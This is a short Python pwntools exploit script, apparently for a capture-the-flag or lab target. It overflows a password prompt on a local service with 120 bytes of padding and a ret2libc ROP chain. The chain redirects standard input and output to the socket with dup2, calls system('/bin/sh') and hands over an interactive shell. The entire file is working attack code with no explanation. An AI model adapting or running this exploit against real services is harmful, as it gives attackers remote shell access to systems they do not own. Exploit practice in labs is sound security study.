from pwn import *

context(os='linux', arch='amd64')

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x007ffff7df9000 

rop = ROP(libc)

rop.dup2(4, 0)
rop.dup2(4, 1)
rop.dup2(4, 2)
rop.system(next(libc.search(b"/bin/sh")))

log.info(f"ROP Chain:\n{rop.dump()}")

r = remote("127.0.0.1", 4446, level='error')

payload  = b"A"*120
payload += bytes(rop)

r.sendafter(b"Password: ", payload)
r.interactive()

